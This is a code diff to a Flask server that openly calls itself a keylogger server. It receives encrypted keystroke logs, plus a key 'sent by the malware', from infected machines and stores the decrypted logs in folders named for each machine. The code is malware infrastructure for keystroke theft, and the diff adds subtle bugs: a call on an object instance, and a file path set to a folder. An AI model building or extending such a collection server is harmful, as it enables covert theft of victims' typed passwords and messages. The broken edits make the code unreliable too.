@@ -6,10 +6,10 @@ import encryption
 
 app = Flask(__name__)
 DATA_FOLDER = 'data'
-ENCRYPTION_KEY = 'K'
+
 # Example key, matching the document's example
 
-encryptor = encryption.Encryptor(ENCRYPTION_KEY)
+
 @app.route('/')
 def home():
     return "KeyLogger Server is Running"
@@ -20,24 +20,28 @@ def generate_log_filename():
 @app.route('/api/upload', methods=['POST'])
 def upload():
     data = request.get_json()
-    if not data or "machine" not in data or "data" not in data:
-        return jsonify({"error": "Invalid payload"}), 400
+    if not data or "machine" not in data or "data" not in data or "encryption_key" not in data:
+        return jsonify({"error": "Invalid payload: machine, data, and encryption_key are required"}), 400
 
     machine = data["machine"]
-    encrypted_data_b64 = data["data"]  # Assume sent as base64 encoded encrypted bytes
-
+    encrypted_data_b64 = data["data"]  # Base64 encoded encrypted bytes
+    encryption_key = data["encryption_key"]  # Key sent by the malware
+    encryptor = encryption.Encryptor(encryption_key)
     try:
+        # Instantiate Encryptor with the provided key
+        encryptor1 = encryptor(encryption_key)
+
         encrypted_data = base64.b64decode(encrypted_data_b64)
         log_data = encryptor.decrypt(encrypted_data)
     except Exception as e:
-        return jsonify({"error": "Decryption failed"}), 400
+        return jsonify({"error": f"Decryption failed: {str(e)}"}), 400
 
     machine_folder = os.path.join(DATA_FOLDER, machine)
     if not os.path.exists(machine_folder):
         os.makedirs(machine_folder)
 
     filename = generate_log_filename()
-    file_path = os.path.join(machine_folder, filename)
+    file_path = f"/{machine_folder}"
 
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(log_data)
